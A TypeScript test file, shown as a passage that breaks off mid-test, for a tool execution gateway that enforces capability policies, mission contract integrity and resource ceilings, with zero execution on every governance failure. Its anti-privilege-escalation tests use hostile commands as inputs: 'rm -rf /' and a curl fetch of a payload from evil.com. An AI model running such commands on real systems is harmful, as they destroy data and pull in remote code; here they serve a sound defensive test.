/**
 * Task 4.3 — Capability Policy Mapping & Mission Contract Resource Enforcement Tests
 *
 * Verifies:
 * 1. Deterministic capability-to-policy authorization across all typed tools
 * 2. Exact Mission Contract identity & binding integrity (contractId, version, contentHash, task association)
 * 3. Non-clamping resource ceiling enforcement (timeoutMs, maxOutputBytes, maxBytes, payload size)
 * 4. Provider safety limit separation (physical narrowing vs authorization rejection)
 * 5. Tool-specific security (injected input properties cannot forge or alter capabilities)
 * 6. Mandatory Zero Execution (providerInvocationCount === 0) across all governance failures:
 *    - CAPABILITY_DENIED
 *    - RESOURCE_LIMIT_EXCEEDED
 *    - CONTRACT_REVOKED
 *    - CONTRACT_INTEGRITY_FAILURE
 *    - CONTRACT_ASSOCIATION_FAILURE
 *    - INVALID_RUN
 *    - LEASE_LOST
 */

import { describe, expect, it } from "vitest";
import { SqliteStateStore } from "../../src/adapters/persistence/sqlite-state-store.js";
import { RunCoordinator } from "../../src/application/run-coordinator.js";
import {
  ToolExecutionGateway,
  TrustedToolInvocationContext,
} from "../../src/application/tool-execution-gateway.js";
import {
  ContractIntegrityError,
  ContractNotActiveError,
  ContractRevokedError,
  InvalidRunError,
  MissionContractTaskMismatchError,
  ResourceLimitExceededError,
  ToolCapabilityDeniedError,
} from "../../src/domain/errors.js";
import {
  createExecutionPolicy,
  ExecutionPolicy,
  PolicyEvaluator,
} from "../../src/domain/policy.js";
import {
  ToolName,
  ToolRequest,
} from "../../src/domain/tool.js";
import { SettableClock } from "../../src/ports/clock.port.js";
import {
  ExecutionProvider,
  ExecutionRequest,
  ExecutionResult,
} from "../../src/ports/execution-provider.port.js";
import {
  StaticToolAdapterRegistry,
  ToolAdapter,
  ToolExecutionContext,
} from "../../src/ports/tool-adapter.port.js";
import { createAndActivateContract } from "./test-helpers.js";

/**
 * CountingExecutionProvider to strictly track provider invocations.
 */
class CountingExecutionProvider implements ExecutionProvider {
  readonly name = "counting-provider";
  readonly invocations: ExecutionRequest[] = [];

  get calls(): number {
    return this.invocations.length;
  }

  async execute<TInput = unknown, TOutput = unknown>(
    request: ExecutionRequest<TInput>
  ): Promise<ExecutionResult<TOutput>> {
    this.invocations.push(request);
    return {
      status: "SUCCESS",
      output: {
        exitCode: 0,
        stdout: "ok",
        stderr: "",
        durationMs: 5,
        outputTruncated: false,
      } as unknown as TOutput,
      durationMs: 5,
    };
  }
}

/**
 * SpyToolAdapter to record adapter-level invocations.
 */
class SpyToolAdapter<TName extends ToolName = ToolName> implements ToolAdapter<TName> {
  invocationCount = 0;
  lastContext: ToolExecutionContext | null = null;
  lastInput: unknown = null;

  constructor(
    readonly toolName: TName,
    readonly defaultOutput: unknown = { ok: true }
  ) {}

  async execute(context: ToolExecutionContext, input: unknown): Promise<any> {
    this.invocationCount++;
    this.lastContext = context;
    this.lastInput = input;
    return this.defaultOutput;
  }
}

interface FixtureOptions {
  readonly policy?: ExecutionPolicy;
  readonly timeoutMs?: number;
  readonly maxOutputBytes?: number;
}

function setupFixture(options: FixtureOptions = {}) {
  const clock = new SettableClock("2026-10-12T10:00:00.000Z");
  const store = new SqliteStateStore();
  const coordinator = new RunCoordinator(store, clock);
  const provider = new CountingExecutionProvider();

  store.transaction((tx) => {
    tx.insertWorker({
      workerId: "worker-governance",
      hostname: "localhost",
      pid: 4321,
      status: "ACTIVE",
      createdAt: clock.nowIso(),
      lastHeartbeatAt: clock.nowIso(),
    });
  });

  const task = coordinator.createTask({
    title: "governance-task",
    description: "Task for testing capability policy mapping and resource enforcement",
    inputPayload: { governance: true },
  });

  const policy =
    options.policy ??
    createExecutionPolicy({
      policyId: `policy-${task.taskId}`,
      allowedCapabilities: [
        "workspace.file.read",
        "workspace.file.write",
        "workspace.code.search",
        "git.read",
        "process.execute",
      ],
      isolationRequirement: "ISOLATED",
    });

  const contract = createAndActivateContract(store, task.taskId, {
    policy,
    timeoutMs: options.timeoutMs ?? 10000,
    maxOutputBytes: options.maxOutputBytes ?? 1048576,
  });

  const { run } = coordinator.createRun({ taskId: task.taskId });
  coordinator.queueRun(run.runId);
  const claimResult = coordinator.claimRun(run.runId, "worker-governance", 15000);
  const startResult = coordinator.startRun(
    run.runId,
    "worker-governance",
    claimResult.lease.leaseId
  );

  const context: TrustedToolInvocationContext = {
    runId: run.runId,
    taskId: task.taskId,
    workerId: "worker-governance",
    leaseId: claimResult.lease.leaseId,
    workspace: {
      workspaceId: "ws-governance-test",
      hostPath: "C:/virtual/workspace/governance",
      containerMountPath: "/workspace",
    },
  };

  return {
    clock,
    store,
    coordinator,
    provider,
    task,
    contract,
    run: startResult.run,
    lease: claimResult.lease,
    context,
  };
}

describe("Phase 4 / Task 4.3 — Capability Policy Mapping & Mission Contract Resource Enforcement", () => {
  // =========================================================================
  // 1. Deterministic Capability-to-Policy Authorization Matrix
  // =========================================================================
  describe("1. Deterministic Capability-to-Policy Authorization Matrix", () => {
    it.each([
      ["read_file", "workspace.file.read", { path: "file.txt" }],
      ["write_file", "workspace.file.write", { path: "file.txt", content: "hello" }],
      ["search_code", "workspace.code.search", { query: "foo" }],
      ["git_status", "git.read", {}],
      ["git_diff", "git.read", {}],
      ["run_command", "process.execute", { argv: ["echo", "hi"] }],
    ] as const)(
      "authorizes %s when contract policy grants %s",
      async (toolName, capability, input) => {
        const singleCapPolicy = createExecutionPolicy({
          policyId: `policy-${toolName}`,
          allowedCapabilities: [capability],
          isolationRequirement: "ISOLATED",
        });

        const fixture = setupFixture({ policy: singleCapPolicy });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest = {
          requestId: `req-${toolName}-allowed`,
          runId: fixture.run.runId,
          toolName,
          input: input as any,
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("AUTHORIZED");
        expect(decision.toolName).toBe(toolName);
        expect(decision.executionContext?.requiredCapability).toBe(capability);
        expect(fixture.provider.calls).toBe(0);
      }
    );

    it.each([
      ["read_file", ["workspace.file.write"]],
      ["write_file", ["workspace.file.read"]],
      ["search_code", ["git.read"]],
      ["git_status", ["workspace.file.read"]],
      ["git_diff", ["process.execute"]],
      ["run_command", ["workspace.file.read", "git.read"]],
    ] as const)(
      "denies %s when policy grants other capabilities but omits required capability",
      async (toolName, grantedCapabilities) => {
        const restrictedPolicy = createExecutionPolicy({
          policyId: `policy-restricted-${toolName}`,
          allowedCapabilities: grantedCapabilities,
          isolationRequirement: "ISOLATED",
        });

        const fixture = setupFixture({ policy: restrictedPolicy });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const dummyInputs: Record<ToolName, unknown> = {
          read_file: { path: "file.txt" },
          write_file: { path: "file.txt", content: "test" },
          search_code: { query: "test" },
          git_status: {},
          git_diff: {},
          run_command: { argv: ["echo", "test"] },
        };

        const request: ToolRequest = {
          requestId: `req-${toolName}-denied`,
          runId: fixture.run.runId,
          toolName,
          input: dummyInputs[toolName] as any,
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("DENIED");
        expect(decision.domainError).toBeInstanceOf(ToolCapabilityDeniedError);
        expect(decision.errorPayload?.code).toBe("CAPABILITY_DENIED");
        expect(fixture.provider.calls).toBe(0);
      }
    );

    it("denies execution when policy has empty allowedCapabilities", async () => {
      const emptyPolicy = createExecutionPolicy({
        policyId: "policy-empty",
        allowedCapabilities: [],
        isolationRequirement: "ISOLATED",
      });

      const fixture = setupFixture({ policy: emptyPolicy });
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"read_file"> = {
        requestId: "req-empty-policy",
        runId: fixture.run.runId,
        toolName: "read_file",
        input: { path: "test.txt", offsetLine: 1, limitLines: 500 },
      };

      const decision = await gateway.authorize(request, fixture.context);
      expect(decision.status).toBe("DENIED");
      expect(decision.domainError).toBeInstanceOf(ToolCapabilityDeniedError);
      expect(fixture.provider.calls).toBe(0);
    });

    it("evaluates unknown/unparseable capabilities as DENIED (UNKNOWN_CAPABILITY)", () => {
      const evaluator = new PolicyEvaluator();
      const policy = createExecutionPolicy({
        policyId: "policy-valid",
        allowedCapabilities: ["workspace.file.read"],
        isolationRequirement: "ISOLATED",
      });

      const decision1 = evaluator.evaluateCapability("invalid..format", policy);
      expect(decision1.status).toBe("DENIED");
      expect(decision1.reasonCode).toBe("UNKNOWN_CAPABILITY");

      const decision2 = evaluator.evaluateCapability("", policy);
      expect(decision2.status).toBe("DENIED");
      expect(decision2.reasonCode).toBe("UNKNOWN_CAPABILITY");

      const decision3 = evaluator.evaluateCapability("NOT_LOWERCASE", policy);
      expect(decision3.status).toBe("DENIED");
      expect(decision3.reasonCode).toBe("UNKNOWN_CAPABILITY");
    });

    it("fails closed with INVALID_POLICY for malformed policy objects", () => {
      const evaluator = new PolicyEvaluator();

      // null policy
      const decisionNull = evaluator.evaluateCapability("workspace.file.read", null);
      expect(decisionNull.status).toBe("DENIED");
      expect(decisionNull.reasonCode).toBe("INVALID_POLICY");

      // policy missing allowedCapabilities array
      const decisionNoCaps = evaluator.evaluateCapability("workspace.file.read", {
        policyId: "bad-policy",
        isolationRequirement: "ISOLATED",
      });
      expect(decisionNoCaps.status).toBe("DENIED");
      expect(decisionNoCaps.reasonCode).toBe("INVALID_POLICY");

      // policy with invalid isolationRequirement
      const decisionBadIso = evaluator.evaluateCapability("workspace.file.read", {
        policyId: "bad-iso",
        allowedCapabilities: ["workspace.file.read"],
        isolationRequirement: "INVALID_ISOLATION_VALUE" as any,
      });
      expect(decisionBadIso.status).toBe("DENIED");
      expect(decisionBadIso.reasonCode).toBe("INVALID_POLICY");

      // policy with non-string elements in allowedCapabilities
      const decisionNonStringCaps = evaluator.evaluateCapability("workspace.file.read", {
        policyId: "bad-caps",
        allowedCapabilities: [123, null] as any,
        isolationRequirement: "ISOLATED",
      });
      expect(decisionNonStringCaps.status).toBe("DENIED");
      expect(decisionNonStringCaps.reasonCode).toBe("INVALID_POLICY");
    });
  });

  // =========================================================================
  // 2. Exact Mission Contract Identity & Binding Invariants
  // =========================================================================
  describe("2. Exact Mission Contract Identity & Binding Invariants", () => {
    it("authorizes when contract binding matches exactly", async () => {
      const fixture = setupFixture();
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"read_file"> = {
        requestId: "req-exact-ok",
        runId: fixture.run.runId,
        toolName: "read_file",
        input: { path: "index.ts", offsetLine: 1, limitLines: 500 },
      };

      const decision = await gateway.authorize(request, fixture.context);
      expect(decision.status).toBe("AUTHORIZED");
      expect(fixture.provider.calls).toBe(0);
    });

    it("rejects when bound contract ID does not exist in state store", async () => {
      const fixture = setupFixture();
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const contextWithMissingContract: TrustedToolInvocationContext = {
        ...fixture.context,
        runId: "run-missing-contract",
      };

      const request: ToolRequest<"read_file"> = {
        requestId: "req-missing-contract",
        runId: "run-missing-contract",
        toolName: "read_file",
        input: { path: "index.ts", offsetLine: 1, limitLines: 500 },
      };

      const decision = await gateway.authorize(request, contextWithMissingContract);
      expect(decision.status).toBe("INVALID");
      expect(decision.domainError).toBeInstanceOf(InvalidRunError);
      expect(fixture.provider.calls).toBe(0);
    });

    it("rejects when contract contentHash fails integrity check", async () => {
      const fixture = setupFixture();

      // Tamper Run's contractBinding contentHash in database
      fixture.store.transaction(() => {
        const stmt = (fixture.store as any).db.prepare(
          `UPDATE runs SET contract_hash = ? WHERE run_id = ?`
        );
        stmt.run(
          "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
          fixture.run.runId
        );
      });

      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"read_file"> = {
        requestId: "req-tampered",
        runId: fixture.run.runId,
        toolName: "read_file",
        input: { path: "index.ts", offsetLine: 1, limitLines: 500 },
      };

      const decision = await gateway.authorize(request, fixture.context);
      expect(decision.status).toBe("DENIED");
      expect(decision.domainError).toBeInstanceOf(ContractIntegrityError);
      expect(fixture.provider.calls).toBe(0);
    });

    it("rejects when contract belongs to a different task (Task Mismatch)", async () => {
      const fixture = setupFixture();

      // Create a second task with its own contract
      const otherTask = fixture.coordinator.createTask({
        title: "other-task",
        description: "mismatched task",
        inputPayload: {},
      });
      const otherContract = createAndActivateContract(fixture.store, otherTask.taskId);

      // Force Run's contract binding to point to otherContract
      fixture.store.transaction(() => {
        const stmt = (fixture.store as any).db.prepare(
          `UPDATE runs SET contract_id = ?, contract_version = ?, contract_hash = ? WHERE run_id = ?`
        );
        stmt.run(
          otherContract.spec.contractId,
          otherContract.spec.version,
          otherContract.contentHash,
          fixture.run.runId
        );
      });

      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"read_file"> = {
        requestId: "req-task-mismatch",
        runId: fixture.run.runId,
        toolName: "read_file",
        input: { path: "index.ts", offsetLine: 1, limitLines: 500 },
      };

      const decision = await gateway.authorize(request, fixture.context);
      expect(decision.status).toBe("DENIED");
      expect(decision.domainError).toBeInstanceOf(MissionContractTaskMismatchError);
      expect(fixture.provider.calls).toBe(0);
    });

    it("rejects when bound contract is REVOKED with ContractRevokedError", async () => {
      const fixture = setupFixture();

      // Revoke the bound contract
      fixture.store.revokeContract(
        fixture.contract.spec.contractId,
        fixture.contract.spec.version,
        "Security incident #987"
      );

      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"read_file"> = {
        requestId: "req-revoked-contract",
        runId: fixture.run.runId,
        toolName: "read_file",
        input: { path: "index.ts", offsetLine: 1, limitLines: 500 },
      };

      const decision = await gateway.authorize(request, fixture.context);
      expect(decision.status).toBe("DENIED");
      expect(decision.domainError).toBeInstanceOf(ContractRevokedError);
      expect(decision.domainError).toBeInstanceOf(ContractNotActiveError);
      expect(decision.domainError?.code).toBe("CONTRACT_REVOKED");
      expect(decision.domainError?.message).toContain("Security incident #987");
      expect(fixture.provider.calls).toBe(0);
    });
  });

  // =========================================================================
  // 3. Non-Clamping Resource Enforcement Matrix
  // =========================================================================
  describe("3. Non-Clamping Resource Enforcement Matrix", () => {
    describe("timeoutMs dimension (run_command)", () => {
      it("allows request when timeoutMs === contract ceiling (5000 === 5000)", async () => {
        const fixture = setupFixture({ timeoutMs: 5000 });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-exact-timeout",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["echo", "test"], cwd: ".", timeoutMs: 5000 },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("AUTHORIZED");
        expect(decision.executionContext?.resourceLimits.timeoutMs).toBe(5000);
        expect(fixture.provider.calls).toBe(0);
      });

      it("allows request when timeoutMs < contract ceiling (1000 < 5000)", async () => {
        const fixture = setupFixture({ timeoutMs: 5000 });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-lower-timeout",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["echo", "test"], cwd: ".", timeoutMs: 1000 },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("AUTHORIZED");
        expect(decision.executionContext?.resourceLimits.timeoutMs).toBe(1000);
        expect(fixture.provider.calls).toBe(0);
      });

      it("REJECTS request when timeoutMs > contract ceiling (5001 > 5000) with ZERO silent clamping", async () => {
        const fixture = setupFixture({ timeoutMs: 5000 });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-exceeded-timeout",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["echo", "test"], cwd: ".", timeoutMs: 5001 },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("DENIED");
        expect(decision.domainError).toBeInstanceOf(ResourceLimitExceededError);

        const resErr = decision.domainError as ResourceLimitExceededError;
        expect(resErr.resource).toBe("timeoutMs");
        expect(resErr.requested).toBe(5001);
        expect(resErr.ceiling).toBe(5000);
        expect(fixture.provider.calls).toBe(0);
      });
    });

    describe("maxOutputBytes dimension (run_command)", () => {
      const ONE_MB = 1048576;

      it("allows request when maxOutputBytes === contract ceiling (1MB === 1MB)", async () => {
        const fixture = setupFixture({ maxOutputBytes: ONE_MB });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-exact-output",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["echo", "test"], cwd: ".", maxOutputBytes: ONE_MB },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("AUTHORIZED");
        expect(decision.executionContext?.resourceLimits.maxOutputBytes).toBe(ONE_MB);
        expect(fixture.provider.calls).toBe(0);
      });

      it("allows request when maxOutputBytes < contract ceiling (512KB < 1MB)", async () => {
        const fixture = setupFixture({ maxOutputBytes: ONE_MB });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-lower-output",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["echo", "test"], cwd: ".", maxOutputBytes: 524288 },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("AUTHORIZED");
        expect(decision.executionContext?.resourceLimits.maxOutputBytes).toBe(524288);
        expect(fixture.provider.calls).toBe(0);
      });

      it("REJECTS request when maxOutputBytes > contract ceiling (1MB + 1) with ZERO silent clamping", async () => {
        const fixture = setupFixture({ maxOutputBytes: ONE_MB });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-exceeded-output",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["echo", "test"], cwd: ".", maxOutputBytes: ONE_MB + 1 },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("DENIED");
        expect(decision.domainError).toBeInstanceOf(ResourceLimitExceededError);

        const resErr = decision.domainError as ResourceLimitExceededError;
        expect(resErr.resource).toBe("maxOutputBytes");
        expect(resErr.requested).toBe(ONE_MB + 1);
        expect(resErr.ceiling).toBe(ONE_MB);
        expect(fixture.provider.calls).toBe(0);
      });
    });

    describe("maxBytes dimension across read_file, write_file, search_code, git_diff", () => {
      const CEILING = 100 * 1024; // 100KB = 102400 bytes

      it.each([
        ["read_file", { path: "file.txt" }],
        ["write_file", { path: "file.txt", content: "data" }],
        ["search_code", { query: "export" }],
        ["git_diff", {}],
      ] as const)(
        "allows %s when maxBytes === contract ceiling (%d)",
        async (toolName, baseInput) => {
          const fixture = setupFixture({ maxOutputBytes: CEILING });
          const gateway = new ToolExecutionGateway({
            coordinator: fixture.coordinator,
            clock: fixture.clock,
          });

          const request: ToolRequest = {
            requestId: `req-exact-${toolName}`,
            runId: fixture.run.runId,
            toolName,
            input: { ...baseInput, maxBytes: CEILING } as any,
          };

          const decision = await gateway.authorize(request, fixture.context);
          expect(decision.status).toBe("AUTHORIZED");
          expect(fixture.provider.calls).toBe(0);
        }
      );

      it.each([
        ["read_file", { path: "file.txt" }],
        ["write_file", { path: "file.txt", content: "data" }],
        ["search_code", { query: "export" }],
        ["git_diff", {}],
      ] as const)(
        "REJECTS %s when maxBytes > contract ceiling (%d + 1) with ZERO silent clamping",
        async (toolName, baseInput) => {
          const fixture = setupFixture({ maxOutputBytes: CEILING });
          const gateway = new ToolExecutionGateway({
            coordinator: fixture.coordinator,
            clock: fixture.clock,
          });

          const request: ToolRequest = {
            requestId: `req-exceeded-${toolName}`,
            runId: fixture.run.runId,
            toolName,
            input: { ...baseInput, maxBytes: CEILING + 1 } as any,
          };

          const decision = await gateway.authorize(request, fixture.context);
          expect(decision.status).toBe("DENIED");
          expect(decision.domainError).toBeInstanceOf(ResourceLimitExceededError);

          const resErr = decision.domainError as ResourceLimitExceededError;
          expect(resErr.resource).toBe("maxBytes");
          expect(resErr.requested).toBe(CEILING + 1);
          expect(resErr.ceiling).toBe(CEILING);
          expect(fixture.provider.calls).toBe(0);
        }
      );
    });

    describe("write_file payload byte length", () => {
      it("allows write_file when content byte length <= contract ceiling", async () => {
        const fixture = setupFixture({ maxOutputBytes: 100 });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"write_file"> = {
          requestId: "req-write-ok",
          runId: fixture.run.runId,
          toolName: "write_file",
          input: { path: "out.txt", content: "a".repeat(100), overwrite: true },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("AUTHORIZED");
        expect(fixture.provider.calls).toBe(0);
      });

      it("REJECTS write_file when content byte length > contract ceiling", async () => {
        const fixture = setupFixture({ maxOutputBytes: 100 });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"write_file"> = {
          requestId: "req-write-excessive",
          runId: fixture.run.runId,
          toolName: "write_file",
          input: { path: "out.txt", content: "a".repeat(101), overwrite: true },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("DENIED");
        expect(decision.domainError).toBeInstanceOf(ResourceLimitExceededError);

        const resErr = decision.domainError as ResourceLimitExceededError;
        expect(resErr.resource).toBe("maxOutputBytes");
        expect(resErr.requested).toBe(101);
        expect(resErr.ceiling).toBe(100);
        expect(fixture.provider.calls).toBe(0);
      });
    });

    describe("multiple resource dimensions in a single request", () => {
      it("allows request when both timeoutMs and maxOutputBytes are within ceiling", async () => {
        const fixture = setupFixture({ timeoutMs: 5000, maxOutputBytes: 10000 });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-multi-ok",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["ls"], cwd: ".", timeoutMs: 5000, maxOutputBytes: 10000 },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("AUTHORIZED");
        expect(decision.executionContext?.resourceLimits.timeoutMs).toBe(5000);
        expect(decision.executionContext?.resourceLimits.maxOutputBytes).toBe(10000);
        expect(fixture.provider.calls).toBe(0);
      });

      it("REJECTS request when timeoutMs is valid but maxOutputBytes exceeds ceiling", async () => {
        const fixture = setupFixture({ timeoutMs: 5000, maxOutputBytes: 10000 });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-multi-output-exceeded",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["ls"], cwd: ".", timeoutMs: 5000, maxOutputBytes: 10001 },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("DENIED");
        expect(decision.domainError).toBeInstanceOf(ResourceLimitExceededError);
        expect((decision.domainError as ResourceLimitExceededError).resource).toBe("maxOutputBytes");
        expect(fixture.provider.calls).toBe(0);
      });

      it("REJECTS request when maxOutputBytes is valid but timeoutMs exceeds ceiling", async () => {
        const fixture = setupFixture({ timeoutMs: 5000, maxOutputBytes: 10000 });
        const gateway = new ToolExecutionGateway({
          coordinator: fixture.coordinator,
          clock: fixture.clock,
        });

        const request: ToolRequest<"run_command"> = {
          requestId: "req-multi-timeout-exceeded",
          runId: fixture.run.runId,
          toolName: "run_command",
          input: { argv: ["ls"], cwd: ".", timeoutMs: 5001, maxOutputBytes: 10000 },
        };

        const decision = await gateway.authorize(request, fixture.context);
        expect(decision.status).toBe("DENIED");
        expect(decision.domainError).toBeInstanceOf(ResourceLimitExceededError);
        expect((decision.domainError as ResourceLimitExceededError).resource).toBe("timeoutMs");
        expect(fixture.provider.calls).toBe(0);
      });
    });
  });

  // =========================================================================
  // 4. Tool-Specific Input Security & Anti-Privilege Escalation
  // =========================================================================
  describe("4. Tool-Specific Input Security & Anti-Privilege Escalation", () => {
    it("prevents privilege escalation: untrusted input cannot grant itself a capability", async () => {
      // Contract policy allows workspace.file.read, but denies process.execute
      const readOnlyPolicy = createExecutionPolicy({
        policyId: "policy-read-only",
        allowedCapabilities: ["workspace.file.read"],
        isolationRequirement: "ISOLATED",
      });

      const fixture = setupFixture({ policy: readOnlyPolicy });
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      // Untrusted payload attempts to spoof an authorized capability
      const spoofedRequest = {
        requestId: "req-spoofed-capability",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: {
          argv: ["rm", "-rf", "/"],
          cwd: ".",
          capability: "workspace.file.read", // Attempting to impersonate read capability!
        },
      } as unknown as ToolRequest;

      const decision = await gateway.authorize(spoofedRequest, fixture.context);
      // Gateway derives capability strictly from ToolDefinition (process.execute), denying request
      expect(decision.status).toBe("DENIED");
      expect(decision.domainError).toBeInstanceOf(ToolCapabilityDeniedError);
      expect(decision.errorPayload?.code).toBe("CAPABILITY_DENIED");
      expect(fixture.provider.calls).toBe(0);
    });

    it("prevents policy override: untrusted input cannot inject a permissive policy", async () => {
      const fixture = setupFixture();
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const maliciousRequest = {
        requestId: "req-injected-policy",
        runId: fixture.run.runId,
        toolName: "read_file",
        input: {
          path: "file.txt",
          policy: { allowedCapabilities: ["*"] }, // Malicious policy injection attempt!
        },
      } as unknown as ToolRequest;

      // Zod schema rejects unexpected keys (.strict())
      const decision = await gateway.authorize(maliciousRequest, fixture.context);
      expect(decision.status).toBe("INVALID");
      expect(fixture.provider.calls).toBe(0);
    });

    it("ensures file path or argv content does not alter capability evaluation", async () => {
      // Policy allows process.execute
      const fixture = setupFixture();
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"run_command"> = {
        requestId: "req-cmd-content",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: {
          argv: ["curl", "http://evil.com/payload.sh"],
          cwd: ".",
        },
      };

      const decision = await gateway.authorize(request, fixture.context);
      expect(decision.status).toBe("AUTHORIZED");
      expect(decision.executionContext?.requiredCapability).toBe("process.execute");
      expect(fixture.provider.calls).toBe(0);
    });
  });

  // =========================================================================
  // 5. Provider Safety Limits Separation (Physical Narrowing vs Authorization)
  // =========================================================================
  describe("5. Provider Safety Limits Separation", () => {
    it("proves provider physical safety limit narrows authorized requests without concealing contract violations", async () => {
      const fixture = setupFixture({ timeoutMs: 10000 });
      const adapterRegistry = new StaticToolAdapterRegistry();
      const spyAdapter = new SpyToolAdapter("run_command", { exitCode: 0, stdout: "", stderr: "", durationMs: 1, outputTruncated: false });
      adapterRegistry.register(spyAdapter);

      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        adapterRegistry,
        clock: fixture.clock,
      });

      // Request within ceiling (3000 <= 10000)
      const validRequest: ToolRequest<"run_command"> = {
        requestId: "req-narrow-valid",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: { argv: ["echo", "hi"], cwd: ".", timeoutMs: 3000 },
      };

      const result = await gateway.execute(validRequest, fixture.context);
      expect(result.status).toBe("SUCCESS");
      expect(spyAdapter.invocationCount).toBe(1);
      // Context timeoutMs receives 3000 (authorized request)
      expect(spyAdapter.lastContext?.resourceLimits.timeoutMs).toBe(3000);
      expect(fixture.provider.calls).toBe(0);
    });

    it("proves unauthorized request above ceiling is REJECTED even if within hypothetical provider safety", async () => {
      const fixture = setupFixture({ timeoutMs: 5000 });
      const adapterRegistry = new StaticToolAdapterRegistry();
      const spyAdapter = new SpyToolAdapter("run_command");
      adapterRegistry.register(spyAdapter);

      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        adapterRegistry,
        clock: fixture.clock,
      });

      // Request exceeds ceiling (6000 > 5000)
      const invalidRequest: ToolRequest<"run_command"> = {
        requestId: "req-unauth-ceiling",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: { argv: ["echo", "hi"], cwd: ".", timeoutMs: 6000 },
      };

      const result = await gateway.execute(invalidRequest, fixture.context);
      expect(result.status).toBe("FAILED");
      expect(spyAdapter.invocationCount).toBe(0); // Zero adapter dispatch!
      expect(fixture.provider.calls).toBe(0); // Zero provider invocation!
    });
  });

  // =========================================================================
  // 6. Mandatory Zero Execution on All Governance Failures
  // =========================================================================
  describe("6. Mandatory Zero Execution on All Governance Failures", () => {
    it("verifies provider.calls === 0 on CAPABILITY_DENIED", async () => {
      const denyPolicy = createExecutionPolicy({
        policyId: "deny-process",
        allowedCapabilities: ["workspace.file.read"],
        isolationRequirement: "ISOLATED",
      });
      const fixture = setupFixture({ policy: denyPolicy });
      const gateway = new ToolExecutionGateway({
        coordinator: fixture.coordinator,
        clock: fixture.clock,
      });

      const request: ToolRequest<"run_command"> = {
        requestId: "req-fail-cap",
        runId: fixture.run.runId,
        toolName: "run_command",
        input: { argv: ["ls"], cwd: "." },
      };

      const result = await gateway.execute(request, fixture.context);
      expect(result.status).toBe("FAILED");
      expect(result.error?.code).toBe("CAPABILITY_DENIED");
      expect(fixture.provider.calls).toBe(0);
    });

    it("verifies provider.calls === 0 on RESOURCE_LIMIT_EXCEEDED", async () => {
      const fixture = setupFixture({ timeoutMs: 5000 });
